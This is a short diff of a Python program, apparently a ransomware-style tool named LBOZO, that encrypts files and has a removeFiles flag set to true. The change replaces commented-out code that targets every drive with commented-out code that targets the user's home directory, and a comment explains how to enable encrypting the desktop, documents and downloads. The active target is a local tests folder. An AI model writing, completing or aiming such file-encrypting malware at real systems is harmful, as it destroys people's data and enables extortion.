@@ -75,14 +75,12 @@ def menu():
 
     removeFiles = True
 
-    #   drives = win32api.GetLogicalDriveStrings()
-    #   drives = drives.split('\000')[:-1]
+    #   userpath = os.path.expanduser('~')
 
     paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
 
     #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
-    #   for drive in drives:
-    #       paths.append(drive)
+    #   paths.append(userpath)
 
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
